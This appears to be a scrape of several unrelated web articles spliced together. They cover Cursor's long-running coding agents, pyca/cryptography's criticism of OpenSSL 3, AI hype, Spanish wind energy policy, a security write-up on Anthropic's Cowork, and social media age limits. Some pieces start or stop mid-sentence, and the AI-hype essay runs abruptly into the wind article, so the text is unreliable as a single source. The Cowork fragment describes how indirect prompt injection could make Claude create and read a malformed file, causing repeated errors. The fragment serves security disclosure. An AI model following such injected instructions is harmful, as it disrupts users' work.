<p>Our first instinct was that planning ahead would be too rigid. The path through a large project is ambiguous, and the right division of work isn't obvious at the start. We began with dynamic coordination, where agents decide what to do based on what others are currently doing.</p>
<h2 id="learning-to-coordinate"><a href="#learning-to-coordinate" aria-label="Link to this section"></a>Learning to coordinate</h2>
<p>Our initial approach gave agents equal status and let them self-coordinate through a shared file. Each agent would check what others were doing, claim a task, and update its status. To prevent two agents from grabbing the same task, we used a locking mechanism.</p>
<p>This failed in interesting ways:</p>
<ol>
<li>
<p>Agents would hold locks for too long, or forget to release them entirely. Even when locking worked correctly, it became a bottleneck. Twenty agents would slow down to the effective throughput of two or three, with most time spent waiting.</p>
</li>
<li>
<p>The system was brittle: agents could fail while holding locks, try to acquire locks they already held, or update the coordination file without acquiring the lock at all.</p>
</li>
</ol>
<p>We tried replacing locks with optimistic concurrency control. Agents could read state freely, but writes would fail if the state had changed since they last read it. This was simpler and more robust, but there were still deeper problems.</p>
<p>With no hierarchy, agents became risk-averse. They avoided difficult tasks and made small, safe changes instead. No agent took responsibility for hard problems or end-to-end implementation. This lead to work churning for long periods of time without progress.</p>
<h2 id="planners-and-workers"><a href="#planners-and-workers" aria-label="Link to this section"></a>Planners and workers</h2>
<p>Our next approach was to separate roles. Instead of a flat structure where every agent does everything, we created a pipeline with distinct responsibilities.</p>
<ul>
<li>
<p><strong>Planners</strong> continuously explore the codebase and create tasks. They can spawn sub-planners for specific areas, making planning itself parallel and recursive.</p>
</li>
<li>
<p><strong>Workers</strong> pick up tasks and focus entirely on completing them. They don't coordinate with other workers or worry about the big picture. They just grind on their assigned task until it's done, then push their changes.</p>
</li>
</ul>
<p>At the end of each cycle, a judge agent determined whether to continue, then the next iteration would start fresh. This solved most of our coordination problems and let us scale to very large projects without any single agent getting tunnel vision.</p>
<h2 id="running-for-weeks"><a href="#running-for-weeks" aria-label="Link to this section"></a>Running for weeks</h2>
<p>To test this system, we pointed it at an ambitious goal: building a web browser from scratch. The agents ran for close to a week, writing over 1 million lines of code across 1,000 files. You can explore the <a href="https://github.com/wilsonzlin/fastrender" rel="noopener noreferrer" target="_blank">source code on GitHub</a>.</p>
<p>Despite the codebase size, new agents can still understand it and make meaningful progress. Hundreds of workers run concurrently, pushing to the same branch with minimal conflicts.</p>
<figure></figure>
<p>While it might seem like a simple screenshot, building a browser from scratch is extremely difficult.</p>
<p>Another experiment was doing an in-place migration of Solid to React in the Cursor codebase. It took over 3 weeks with +266K/-193K edits. As we've started to test the changes, we do believe it's possible to merge this change.</p>
<figure><p><img alt="Pull request showing Solid to React migration" loading="lazy" width="800" height="450" decoding="async" data-nimg="1" srcset="https://cursor.com/marketing-static/_next/image?url=https%3A%2F%2Fptht05hbb1ssoooe.public.blob.vercel-storage.com%2Fassets%2Fblog%2Flong-running-agents-pr.png&amp;w=828&amp;q=70 1x, https://cursor.com/marketing-static/_next/image?url=https%3A%2F%2Fptht05hbb1ssoooe.public.blob.vercel-storage.com%2Fassets%2Fblog%2Flong-running-agents-pr.png&amp;w=1920&amp;q=70 2x" src="https://cursor.com/marketing-static/_next/image?url=https%3A%2F%2Fptht05hbb1ssoooe.public.blob.vercel-storage.com%2Fassets%2Fblog%2Flong-running-agents-pr.png&amp;w=1920&amp;q=70"></p></figure>
<p>Another experiment was to improve an upcoming product. A long-running agent made video rendering 25x faster with an efficient Rust version. It also added support to zoom and pan smoothly with natural spring transitions and motion blurs, following the cursor. This code was merged and will be in production soon.</p>
<p>We have a few other interesting examples still running:</p>
<ul>
<li><a href="https://github.com/wilson-anysphere/indonesia" rel="noopener noreferrer" target="_blank">Java LSP</a>: 7.4K commits, 550K LoC</li>
<li><a href="https://github.com/wilsonzlin/aero" rel="noopener noreferrer" target="_blank">Windows 7 emulator</a>: 14.6K commits, 1.2M LoC</li>
<li><a href="https://github.com/wilson-anysphere/formula" rel="noopener noreferrer" target="_blank">Excel</a>: 12K commits, 1.6M LoC</li>
</ul>
<h2 id="what-weve-learned"><a href="#what-weve-learned" aria-label="Link to this section"></a>What we've learned</h2>
<p>We've deployed billions of tokens across these agents toward a single goal. The system isn't perfectly efficient, but it's far more effective than we expected.</p>
<p>Model choice matters for extremely long-running tasks. We found that GPT-5.2 models are much better at extended autonomous work: following instructions, keeping focus, avoiding drift, and implementing things precisely and completely.</p>
<p>Opus 4.5 tends to stop earlier and take shortcuts when convenient, yielding back control quickly. We also found that different models excel at different roles. GPT-5.2 is a better planner than GPT-5.1-codex, even though the latter is trained specifically for coding. We now use the model best suited for each role rather than one universal model.</p>
<p>Many of our improvements came from removing complexity rather than adding it. We initially built an integrator role for quality control and conflict resolution, but found it created more bottlenecks than it solved. Workers were already capable of handling conflicts themselves.</p>
<p>The best system is often simpler than you'd expect. We initially tried to model systems from distributed computing and organizational design. However, not all of them work for agents.</p>
<p>The right amount of structure is somewhere in the middle. Too little structure and agents conflict, duplicate work, and drift. Too much structure creates fragility.</p>
<p>A surprising amount of the system's behavior comes down to how we prompt the agents. Getting them to coordinate well, avoid pathological behaviors, and maintain focus over long periods required extensive experimentation. The harness and models matter, but the prompts matter more.</p>
<h2 id="whats-next"><a href="#whats-next" aria-label="Link to this section"></a>What's next</h2>
<p>Multi-agent coordination remains a hard problem. Our current system works, but we're nowhere near optimal. Planners should wake up when their tasks complete to plan the next step. Agents occasionally run for far too long. We still need periodic fresh starts to combat drift and tunnel vision.</p>
<p>But the core question, can we scale autonomous coding by throwing more agents at a problem, has a more optimistic answer than we expected. Hundreds of agents can work together on a single codebase for weeks, making real progress on ambitious projects.</p>
<p>The techniques we're developing here will eventually inform Cursor's agent capabilities. If you're interested in working on the hardest problems in AI-assisted software development, we'd love to hear from you at <a href="mailto:hiring@cursor.com" rel="noopener noreferrer" target="_blank">hiring@cursor.com</a>.</p></div></div>]]></description>

<div id="readability-page-1" class="page"><section id="the-state-of-openssl-for-pyca-cryptography" itemprop="articleBody" role="main" itemscope="itemscope" itemtype="http://schema.org/Article">

<p><strong>Published: January 14, 2026</strong></p>
<p>For the past 12 years, we (Paul Kehrer and Alex Gaynor) have maintained the Python <code><span>cryptography</span></code> library (also known as <code><span>pyca/cryptography</span></code> or <a href="http://cryptography.io/">cryptography.io</a>). For that entire period, we’ve relied on OpenSSL to provide core cryptographic algorithms. This past October, <a href="https://www.youtube.com/watch?v=RUIguklWwx0">we gave a talk at the OpenSSL Conference</a> describing our experiences. This talk focuses on the growing problems we have with OpenSSL’s direction. The mistakes we see in OpenSSL’s development have become so significant that we believe substantial changes are required — either to OpenSSL, or to our reliance on it.</p>
<p>Fundamentally, OpenSSL’s trajectory can be understood as a play in three acts:</p>
<ul>
<li><p>In the pre-Heartbleed era (pre-2014), OpenSSL was under-maintained and languishing, substantially lagging behind expectations.</p></li>
<li><p>In the immediate post-Heartbleed era, OpenSSL’s maintenance was reinvigorated and it made substantial progress and improvements. It grew a real code review process, began running tests in CI, adopted fuzz testing, and matured its release process.</p></li>
<li><p>Finally, in 2021 OpenSSL 3 was released. OpenSSL 3 introduced new APIs and had large internal refactors. Relative to previous OpenSSL versions, OpenSSL 3 had significant regressions in performance, complexity, API ergonomics, and didn’t make needed improvements in areas like testing, verification, and memory safety. Over the same period, OpenSSL’s forks have all made progress in these areas. Many of our concerns about OpenSSL’s direction in this time have substantial overlap with <a href="https://www.haproxy.com/blog/state-of-ssl-stacks">those highlighted by HAProxy</a>.</p></li>
</ul>
<p>The remainder of this post describes the problems we have with OpenSSL in more detail, and concludes with the changes we are making to our own policies in response. To avoid burying the lede, we intend to pursue several approaches to reducing our reliance on OpenSSL.</p>
<section id="performance">
<h2>Performance<a href="#performance" title="Link to this heading"></a></h2>
<p>Compared to OpenSSL 1.1.1, OpenSSL 3 has significant performance regressions in areas such as parsing and key loading.</p>
<p>Several years ago, we filed a bug reporting that elliptic curve public key loading had regressed 5-8x between OpenSSL 1.1.1 and 3.0.7. The reason we had noticed this is that performance had gotten so bad that we’d seen it in our test suite runtimes. Since then, OpenSSL has improved performance such that it’s <em>only</em> 3x slower than it used to be. But more significantly, the response to the issue was that, ‘regression was expected with OpenSSL 3, and while there might be some optimizations, we shouldn’t expect it to ever get back to 1.1.1 levels’. Performance regressions can be acceptable, and even appropriate, when they improve other areas of the library, however as we’ll describe, the cause of these regressions has been <em>other</em> mistakes, and not offsetting improvements.</p>
<p>As a result of these sorts of regressions, when <code><span>pyca/cryptography</span></code> migrated X.509 certificate parsing from OpenSSL to our own Rust code, we got a 10x performance improvement relative to OpenSSL 3 (n.b., some of this improvement is attributable to advantages in our own code, but much is explainable by the OpenSSL 3 regressions). Later, moving public key parsing to our own Rust code made end-to-end X.509 path validation 60% faster — just improving key loading led to a 60% end-to-end improvement, that’s how extreme the overhead of key parsing in OpenSSL was.</p>
<p>The fact that we are able to achieve better performance doing our own parsing makes clear that doing better is practical. And indeed, our performance is not a result of clever SIMD micro-optimizations, it’s the result of doing simple things that work: we avoid copies, allocations, hash tables, indirect calls, and locks — none of which should be required for parsing basic DER structures.</p>
</section>
<section id="complexity-and-apis">
<h2>Complexity and APIs<a href="#complexity-and-apis" title="Link to this heading"></a></h2>
<p>OpenSSL 3 started the process of substantially changing its APIs — it introduced <code><span>OSSL_PARAM</span></code> and has been using those for all new API surfaces (including those for post-quantum cryptographic algorithms). In short, <code><span>OSSL_PARAM</span></code> works by passing arrays of key-value pairs to functions, instead of normal argument passing. This reduces performance, reduces compile-time verification, increases verbosity, and makes code less readable. To the extent there is an argument in favor of it, we infer that the benefit is that it allows OpenSSL to use the same API (and ABI) for different algorithms with different parameters, allowing things like reading algorithm parameters from configuration files with generic configuration parsing code that doesn’t need to be updated when new algorithms are added to OpenSSL.</p>
<p>For a concrete comparison of the verbosity, performing an ML-KEM encapsulation with OpenSSL takes 37 lines with 6 fallible function calls. Doing so with BoringSSL takes 19 lines with 3 fallible function calls.</p>
<p>In addition to making public APIs more frustrating and error prone to use, OpenSSL internals have also become more complex. For example, in order to make managing arrays of <code><span>OSSL_PARAM</span></code> palatable, many OpenSSL source files are no longer simply C files, they now have a custom Perl preprocessor for their C code.</p>
<p>OpenSSL 3 also introduced the notion of “providers” (obsoleting, but not replacing, the previous ENGINE APIs), which allow for external implementations of algorithms (including algorithms provided by OpenSSL itself). This was the source of innumerable performance regressions, due to poorly designed APIs. In particular, OpenSSL allowed replacing any algorithm at any point in program execution, which necessitated adding innumerable allocations and locks to nearly every operation. To mitigate this, OpenSSL then added more caches, and ultimately RCU (Read-Copy-Update) — a complex memory management strategy which had difficult to diagnose bugs.</p>
<p>From our perspective, this is a cycle of compounding bad decisions: the providers API was incorrectly designed (there is no need to be able to redefine SHA-256 at arbitrary points in program execution) leading to performance regressions. This led to additional complexity to mitigate those regressions in the form of caching and RCU, which in term led to more bugs. And after all that, performance was <em>still</em> worse than it had been at the beginning.</p>
<p>Finally, taking an OpenSSL public API and attempting to trace the implementation to see how it is implemented has become an exercise in self-flagellation. Being able to read the source to understand how something works is important both as part of <a href="https://alexgaynor.net/2019/jul/11/read-code-more/">self-improvement in software engineering</a>, but also because as sophisticated consumers there are inevitably things about how an implementation works that aren’t documented, and reading the source gives you ground truth. The number of indirect calls, optional paths, <code><span>#ifdef</span></code>, and other obstacles to comprehension is astounding. We cannot overstate the extent to which just reading the OpenSSL source code has become miserable — in a way that both wasn’t true previously, and isn’t true in LibreSSL, BoringSSL, or AWS-LC.</p>
</section>
<section id="testing-and-verification">
<h2>Testing and Verification<a href="#testing-and-verification" title="Link to this heading"></a></h2>
<p>We joke that the Python Cryptographic Authority is a CI engineering project that incidentally produces a cryptography library. The joke reflects our real belief that investment in testing and automation enables <a href="https://en.wikipedia.org/wiki/Pareto_efficiency">Pareto improvements</a> in development speed and correctness — to the point that it can make other work look trivial.</p>
<p>The OpenSSL project does not sufficiently prioritize testing. While OpenSSL’s testing has improved substantially since the pre-Heartbleed era there are quite significant gaps. The gaps in OpenSSL’s test coverage were acutely visible during the OpenSSL 3.0 development cycle — where the project was extremely reliant on the community to report regressions experienced during the extended alpha and beta period (covering 19 pre-releases over the course of 16 months), because their own tests were insufficient to catch unintended real-world breakages. Despite the known gaps in OpenSSL’s test coverage, it’s still common for bug fixes to land without an accompanying regression test.</p>
<p>OpenSSL’s CI is exceptionally flaky, and the OpenSSL project has grown to tolerate this flakiness, which masks serious bugs. OpenSSL 3.0.4 contained a critical buffer overflow in the RSA implementation on AVX-512-capable CPUs. This bug was actually caught by CI — but because the crash only occurred when the CI runner happened to have an AVX-512 CPU (not all did), the failures were apparently dismissed as flakiness. Three years later, the project still merges code with failing tests: the day we prepared our conference slides, five of ten recent commits had failing CI checks, and the day before we delivered the talk, every single commit had failing cross-compilation builds.</p>
<p>This incident also speaks to the value of adopting tools like Intel SDE, which allows controlled testing against CPUs with different subsets of x86-64 extension instructions. Using Intel SDE to have dedicated test jobs with and without AVX-512 would have made the nature of the failure immediately legible and reproducible.</p>
<p>OpenSSL is not keeping pace with the state of the art in formal verification. Formal methods have gone from academic novelty to practical reality for meaningful chunks of cryptographic code. BoringSSL and AWS-LC have incorporated formally verified implementations and use automated reasoning to increase assurance.</p>
</section>
<section id="memory-safety">
<h2>Memory Safety<a href="#memory-safety" title="Link to this heading"></a></h2>
<p>At the time OpenSSL was created, there were no programming languages that meaningfully provided performance, embeddability, and memory safety — if you wanted a memory safe language, you were committing to giving up performance and adding a garbage collector.</p>
<p>The world has changed. Nearly 5 years ago, <code><span>pyca/cryptography</span></code> issued our first release incorporating Rust code, and since then we have migrated nearly all functionality to Rust, using a mix of pure-Rust for all parsing and X.509 operations combined with using OpenSSL for providing cryptographic algorithms — gaining performance wins and avoiding several OpenSSL CVEs. <a href="https://www.youtube.com/watch?v=z_Eiy2W0APU">We know these transitions are possible</a>.</p>
<p>A library committed to security needs to make a long-term commitment to a migration to a memory safe programming language. OpenSSL has shown no initiative at all on this issue.</p>
</section>
<section id="contributing-causes">
<h2>Contributing Causes<a href="#contributing-causes" title="Link to this heading"></a></h2>
<p>Whenever issues with an open source project are raised, many will suggest this is an issue of funding or tragedy of the commons. This is inapposite, in the past decade, post-Heartbleed, OpenSSL has received considerable funding, and at this moment the OpenSSL Corporation and Foundation employ more software engineers than work full time on either BoringSSL or LibreSSL. The problems we have described are not ones caused by underfunding.</p>
<p>We do not fully understand the motivations that led to the public APIs and internal complexity we’ve described here. We’ve done our best to reverse engineer them by asking “what would motivate someone to do this” and often we’ve found ourselves coming up short. The fact that none of the other OpenSSL forks have made these same design choices is informative to the question of “was this necessary”.</p>
</section>
<section id="future-directions">
<h2>Future Directions<a href="#future-directions" title="Link to this heading"></a></h2>
<p>Our experience with OpenSSL has been on a negative trajectory for several years. As a result of these issues, we are making the following changes to our (admittedly undocumented) policies.</p>
<p>First, we will no longer require OpenSSL implementations for new functionality. Where we deem it desirable, we will add new APIs that are only on LibreSSL/BoringSSL/AWS-LC. Concretely, we expect to add ML-KEM and ML-DSA APIs that are only available with LibreSSL/BoringSSL/AWS-LC, and not with OpenSSL.</p>
<p>Second, we currently statically link a copy of OpenSSL in our wheels (binary artifacts). We are beginning the process of looking into what would be required to change our wheels to link against one of the OpenSSL forks.</p>
<p>If we are able to successfully switch to one of OpenSSL’s forks for our binary wheels, we will begin considering the circumstances under which we would drop support for OpenSSL entirely.</p>
<p>Lastly, in the long term, we are actively tracking non-OpenSSL derived cryptography libraries such as Graviola as potential alternatives.</p>
<p>We recognize that changes in which libraries we use to provide cryptographic implementations have substantial impact on our users — particularly redistributors. We do not contemplate these steps lightly, nor do we anticipate making them hastily. However, due to the gravity of our concerns, we are compelled to act. If you rely on <code><span>pyca/cryptography</span></code>’s support for OpenSSL, the best way to avoid the most drastic steps contemplated here is to engage with the OpenSSL project and contribute to improvements on these axes.</p>

<div id="readability-page-1" class="page"><div>
      <p>Last week, the developer community was busy discussing about a single tweet:</p>
<blockquote><p lang="en" dir="ltr">I'm not joking and this isn't funny. We have been trying to build distributed agent orchestrators at Google since last year. There are various options, not everyone is aligned... I gave Claude Code a description of the problem, it generated what we built last year in an hour.</p>— Jaana Dogan ヤナ ドガン (@rakyll) <a href="https://twitter.com/rakyll/status/2007239758158975130?ref_src=twsrc%5Etfw">January 2, 2026</a></blockquote>



<p>The author is Jaana Dogan (known as <a href="https://github.com/rakyll">Rakyll</a>), a highly respected figure in the Google ecosystem, in the open-source world, and in my heart (thank you Rakyll for your great <a href="https://rakyll.org/">Go blog posts</a>).</p>
<p>At first glance, the tweet suggests an enormous shift in the software industry: the ability to build <strong>in just one hour</strong> what previously required weeks or months for a team of sofware engineers, using <strong>just</strong> the description of the problem. The tweet was too-much dramatic in my own opinion, but actually impressive!</p>
<p>The post triggered an immediate wave of “doom-posting,” with many fearing for the future of software engineering (as each week since a year now).
However, as the conversation reached a high number of replies and citations on social networks, Rakyll released a follow-up thread to provide context:</p>
<blockquote><div lang="en" dir="ltr"><p>To cut through the noise on this topic, it’s helpful to provide more more context:</p><p>- We have built several versions of this system last year. - There are tradeoffs and there hasn't been a clear winner.<br>- When prompted with the best ideas that survived, coding agents are able to… <a href="https://t.co/k5FvAah7yc">https://t.co/k5FvAah7yc</a></p></div>— Jaana Dogan ヤナ ドガン (@rakyll) <a href="https://twitter.com/rakyll/status/2007659740126761033?ref_src=twsrc%5Etfw">January 4, 2026</a></blockquote>



<p>This response thread revealed a story <strong>far less miraculous</strong> than the original tweet suggested.
Let’s analyze it.</p>
<p>Crucially, <strong>the foundational “thinking” had already been performed by Rakyll herself</strong>, who guided the AI using architectural concepts (honed over several weeks or months of prior effort) rather than the AI thinking and inventing the “product” from scratch.<br>
Furthermore, <strong>the resulting project was strictly a proof-of-concept</strong> that falls far short of a production-ready system capable of managing real-world complexity.<br>
And finally, this success hinged on the Rakyll’s <strong>implicit domain knowledge and deep expertise</strong>. The last point is often (strategically?) omitted from these “magic” viral demonstrations in order to make the tool appear way more autonomous than it truly is.</p>
<p>Hmm. Now, this is far less exciting…</p>
<h2 id="under-influence">
  Under influence
  <a href="#under-influence">#</a>
</h2>
<p>This pattern of “<em>hype first and context later</em>” is actually part of a growing trend.</p>
<p>I call the individuals participating to that trend “<strong>The Influentists</strong>”.
Those people are members of a scientific or technical community, and leverage their large audiences to propagate claims that are, at best, unproven and, at worst, <em>intentionally</em> misleading.</p>
<p>But how can we spot them?</p>
<p>I personally identify these “Influentists” by four personality traits that characterize their public discourse.<br>
The first is a reliance on <strong>"<em>trust-me-bro</em>" culture</strong>, where anecdotal experiences are framed as universal, objective truths to generate hype. This is a sentiment perfectly captured by the <em>“I’m not joking and this isn’t funny”</em> tone of Rakyll’s original tweet, but also the dramatic <em>“I’ve never felt that much behind as a programmer”</em> from Andrej Karpathy’s tweet.
This is supported by an <strong>absence of reproducible proof</strong>, as these individuals rarely share the code, data, or methodology behind their viral “wins”, an omission made easier than ever in the current LLM era.
And finally, they utilize <strong>strategic ambiguity</strong>, carefully wording their claims with enough vagueness to pivot toward a “clarification” if the technical community challenges their accuracy.</p>

<p>Rakyll is far from alone. We see this “hype-first” approach across major AI firms like Anthropic, OpenAI, or Microsoft.</p>
<p>Consider Galen Hunt, a Distinguished Engineer at Microsoft. He recently made waves by claiming a goal to rewrite Microsoft’s massive C/C++ codebases into Rust by 2030 using AI.</p>

<p>Wind power is consolidating its position as one of the pillars of the energy and economic system in Spain, although it is going through a key moment marked by regulatory blockages that threaten its development. This renewable energy source is set to become the leading technology in the electricity mix, with a production of 59,378 GW and a coverage of 24% of demand, according to the macroeconomic study of the impact of the wind energy sector in Spain 2024, prepared by Deloitte and presented by the Spanish wind energy association (AEE).</p>
<p>The sector contributed 0.25% to GDP and enabled savings on consumers' electricity bills of more than 4.6 billion euros in 2024, with an average reduction in the wholesale price of close to 20 euros per MWh. Between 2012 and 2024, the accumulated savings exceed 47.4 billion, according to the study. The sector also employed 37,070 people, 4.7% more than the previous year, with high value-added jobs and a clear industrial vocation in regions such as Galicia, the Basque Country and Andalucía. Spain is also the world's fourth largest exporter of wind turbines, behind only China, Denmark and Germany, with exports valued at 1.95 billion euros, which are growing steadily year after year.</p>

<p>However, in the eyes of the sector, if Spain does not unblock regulatory bottlenecks, provide legal certainty for projects and accelerate electrification, "Spain will lose a historic opportunity for reindustrialisation and progress", director general of AEE Juan Virgilio Márquez warns. According to the sector, one of the main immediate challenges is to accelerate the electrification of the economy and increase electricity demand to prevent zero or negative prices from perpetuating in the market, which conditions investment decisions.</p>
<p>Despite the fact that the installed capacity reached 31,679 MW in 2024, after adding 1,185 MW, the sector warns that the current pace is insufficient to meet the objectives of the national integrated energy and climate plan (PNIEC). "The reason is that the administrative process is very complex. Different criteria are applied in different parts of Spain and even between individual projects. This is slowing down the pace necessary for the natural growth demanded by the industry," Márquez says.</p>

<p>Spain should be installing around four gigawatts of wind energy per year, but barely reaches one gigawatt per year. In his opinion, it is essential to coherently apply the principle of the higher public interest of renewables, which is included in European legislation but not yet fully adopted into Spanish law, in order to provide security and stability to the development of new projects.</p>
<p>The reality is that projects or industrial capacity are not lacking, but administrative and judicial obstacles make it almost impossible to meet the forecasts for 2030. More than ten gigawatts have administrative authorisation for construction, although some three gigawatts remain paralysed in Galicia. Added to this are 9.2 GW with a favourable environmental declaration pending authorisation and more than 17,000 MW blocked since 2018, mostly due to unfavourable environmental reports. According to the sector, for every megawatt installed in recent years, four have not been developed. It calls for the effective application of the European principle of overriding public interest in renewables to unblock projects and provide regulatory stability.</p>
<p>
<h3>
Repowering, security of supply and offshore wind
</h3>
</p>
<p>Another major strategic vector is the repowering of existing wind farms. Spain has more than ten gigawatts that are more than 20 years old and nearly three gigawatts that are more than 25 years old - installations located in areas that are already anthropised, with a known resource and consolidated social endorsement. However, current regulatory and environmental constraints mean that, in some cases, repowering a wind farm may even mean a loss of power. The sector is calling for a clear roadmap, with incentives, improvements in grid access and regulatory security that will allow business decisions to be anticipated and to make the most of this potential. In particular, the situation in Galicia is of concern, where paralysed projects imply not only a brake on the energy transition, but also the loss of industrial and employment opportunities. The AEE estimates that the current blockage jeopardises the creation of some 4,000 jobs.</p>
<p>At the same time, the sector is calling for enhancing the security of the electricity system through the effective activation of the technical regulations necessary for renewables to provide stability services, such as voltage control, grid forming or the damping of oscillations. Although companies are willing to be authorised to provide these services, they warn of the costs, regulatory risks and the need for clear and coordinated planning with the system operator to avoid distortions.</p>
<p>Offshore wind is set to become a long-term industrial sector, but the ministerial order for the first pilot auction of this type of wind is still pending development. According to AEE, even with a first auction in 2026, the first wind farms would not be operational until 2033. Delaying this first step would mean giving up the creation of more than 4,000 jobs associated with the first gigawatt and losing ground to countries such as France, Norway, the UK and the Netherlands, which are already moving forward with defined policies and auctions. Márquez insists on the need to activate an initial market that allows the Spanish industry to position itself from the outset in the global offshore wind value chain.</p>
<p>All of this takes place in a context of high tax pressure. The sector suffers a tax impact of close to 600 million euros per year, mainly derived from the 7% tax on the value of electricity production, the temporary energy levy and specific figures such as the wind tax in Aragon. According to AEE calculations, for every 1,000 euros of income, 224 euros are spent on taxes and levies - a burden that far exceeds expenditure on personnel and which penalises new investment.</p>

When operating on a malformed PDF (ends .pdf, but it is really a text file with a few sentences in it), after trying to read it once, Claude starts throwing an API error in every subsequent chat in the conversation.</p><p><img alt="Attempting to read a file with the wrong extension provokes repeated API errors." width="2108" height="1322" src="https://framerusercontent.com/images/5Wt3USKsw3SnUb4PXtqqVkmBU.png" srcset="https://framerusercontent.com/images/5Wt3USKsw3SnUb4PXtqqVkmBU.png?scale-down-to=512&amp;width=4217&amp;height=2644 512w,https://framerusercontent.com/images/5Wt3USKsw3SnUb4PXtqqVkmBU.png?scale-down-to=1024&amp;width=4217&amp;height=2644 1024w,https://framerusercontent.com/images/5Wt3USKsw3SnUb4PXtqqVkmBU.png?scale-down-to=2048&amp;width=4217&amp;height=2644 2048w,https://framerusercontent.com/images/5Wt3USKsw3SnUb4PXtqqVkmBU.png?scale-down-to=4096&amp;width=4217&amp;height=2644 4096w,https://framerusercontent.com/images/5Wt3USKsw3SnUb4PXtqqVkmBU.png?width=4217&amp;height=2644 4217w" data-framer-original-sizes="" sizes="(min-width: 1080px) 100vw, (min-width: 810px) and (max-width: 1079.98px) 100vw, (max-width: 809.98px) 100vw"></p><p>We posit that it is likely possible to exploit this failure via indirect prompt injection to cause a limited denial of service attack (e.g., an injection can elicit Claude to create a malformed file, and then read it). Uploading the malformed file via the files API resulted in notifications with an error message, both in the Claude client and the Anthropic Console.</p><h3 id="agentic-blast-radius"><a href="#agentic-blast-radius">Agentic Blast Radius</a></h3><div><p>One of the key capabilities that Cowork was created for is the ability to interact with one's entire day-to-day work environment. This includes the browser and MCP servers, granting capabilities like sending texts, controlling one's Mac with AppleScripts, etc. </p><p>These functionalities make it increasingly likely that the model will process both sensitive and untrusted data sources (which the user does not review manually for injections), making prompt injection an ever-growing attack surface. We urge users to exercise caution when configuring Connectors. Though this article demonstrated an exploit without leveraging Connectors, we believe they represent a major risk surface likely to impact everyday users.</p></div></div></div>]]></description>

age be 16, as in Australia, or should it be 15, as might become the case in </span><a href="https://www.lemonde.fr/en/pixels/article/2026/01/02/ban-on-social-media-for-under-15s-what-we-know-about-the-government-s-plan_6749022_13.html" rel="">France</a><span>?</span></strong></p></li><li><p><strong>Should there be an option for parents to give consent for adolescents below that age?</strong></p></li></ol><p><strong>The correct answers: </strong><em><strong>16, and no.</strong></em></p><p><strong>Here’s why:</strong></p><p><span>I devoted an entire chapter of </span><em>The Anxious Generation</em><span> to puberty because it is such a crucial period of brain re-wiring and </span><a href="https://anthrosource.onlinelibrary.wiley.com/doi/10.1525/eth.1992.20.3.02a00030" rel="">identity formation</a><span>. Developmental psychologists see puberty as a “</span><a href="https://www.cell.com/trends/cognitive-sciences/abstract/S1364-6613(15)00172-2" rel="">sensitive period</a><span>” in which the brain is especially “plastic” or malleable based on incoming experience. The brain is changing over from the child form to the adult form, and those changes are guided by whatever a child does repeatedly. Neurons that fire together wire together, as brain researchers say.</span></p><p><span>The average adolescent in the U.S. now spends around </span><a href="https://news.gallup.com/poll/512576/teens-spend-average-hours-social-media-per-day.aspx" rel="">five hours a day</a><span> using social media. Their brains will enhance whichever neurons and circuits are activated repeatedly, at the expense of neurons and circuits that are underused. This brain sculpting happens throughout childhood, and continues on in the pre-frontal cortex until around age 25. But in the earlier part of adolescence — specifically puberty — the sculpting is more intense, and the changes are more likely to be permanent.</span></p><p><span>The age range of puberty varies across cultures and historical eras, but in modern developed nations it </span><a href="https://my.clevelandclinic.org/health/body/puberty" rel="">generally</a><span> </span><a href="https://onlinelibrary.wiley.com/doi/10.1111/ppe.12507" rel="">begins</a><span> between ages 8–13 for girls and a year or two later for boys. By almost any measure, the median boy and the median girl are still in puberty on their 15th birthday. Most are still getting </span><a href="https://pmc.ncbi.nlm.nih.gov/articles/PMC7983983/" rel="">taller</a><span>. Their secondary sex characteristics are still changing. Large population studies of </span><a href="https://publications.aap.org/pediatrics/article-abstract/110/5/911/64524/National-Estimates-of-the-Timing-of-Sexual" rel="">American</a><span> and </span><a href="https://onlinelibrary.wiley.com/doi/10.1111/ppe.12507" rel="">European</a><span> teens show that the median girl reaches Tanner stage 5 (the last stage of genital development) between 15 and 16, while the median boy reaches stage 5 around 16 or 17. There is wide variation for both sexes. The ability to self-regulate </span><a href="https://pmc.ncbi.nlm.nih.gov/articles/PMC6473801/" rel="">improves steadily throughout adolescence</a><span>, only reaching a plateau in the mid 20s.</span></p><p><span>In other words: Half or more of all girls are still in puberty on their 15th birthday, and half or more of all boys are still in puberty on their 16th birthday. This is a major reason why 16 is a much better choice for a minimum age than 15. (Of course, 18 would be even better than 16, but we nominated 16 as the norm in </span><em>The Anxious Generation</em><span> because our goal was to pick the highest age that we thought could actually get enacted across many jurisdictions.)</span></p><p>Puberty is the period when parents should be most careful about how their children spend their time and who (or what) is influencing their developing brains and identities. Traditionally, human societies helped children make the jump from child to adult during this crucial period, with rites of passage in which trusted, non-parental adults guided them through challenges, hardships, and lessons.</p><p><span>But what do we do in Western nations? We generally mark the beginning of puberty by giving kids smartphones (average age in the U.S. </span><a href="https://www.pewresearch.org/internet/2025/10/08/how-parents-manage-screen-time-for-kids/" rel="">is around</a><span> </span><a href="https://sapienlabs.org/wp-content/uploads/2025/05/Smartphones-and-Mind-Health-final.pdf" rel="">11 or 12</a><span>). We then outsource their social and neural development to Instagram, TikTok, and YouTube. The results </span><a href="https://www.anxiousgeneration.com/research/the-evidence" rel="">have been catastrophic</a><span> for their mental health, social relationships, education, and ability to focus for more than a few minutes.</span></p><p><span>So does it matter whether the age cutoff is 15, rather than 16? Yes. Puberty is the time when social media is likely to do the most damage, and most adolescents, including the large majority of boys, are still in puberty at 15. A 2022 paper by </span><a href="https://www.nature.com/articles/s41467-022-29296-3" rel="">Orben and her colleagues</a><span> even found that there was a peak “developmental window of sensitivity to social media,” such that heavy use by boys at ages 14 and 15 most strongly predicted decreased life satisfaction a year later. (For girls the peak sensitivity was ages 11 through 13).</span></p><p>Sixteen may feel like a more obvious or natural choice for the age of “digital adulthood” in the U.S. because the minimum age for a driver’s license is 16 in most states, (though it is higher in most other countries). Similarly, people in some European countries may see 15 as an obvious or natural choice because that is the age of consent in some countries, the age at which adolescents can legally engage in sexual activity.</p><p>But the fact remains: Any nation that sets 15 as the minimum age rather than 16 will condemn its children to an extra year of brain-sculpting by social media at a time when their brains are still highly sculptable. It will also greatly increase the risk of exposure to pornography, sextortion, online cruelty, and other risky interactions with anonymous strangers at an age when teens have less ability to self-regulate or know what is safe.</p><p data-attrs="{&quot;url&quot;:&quot;https://www.afterbabel.com/p/why-every-country-should-set-16?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;,&quot;action&quot;:null,&quot;class&quot;:null}" 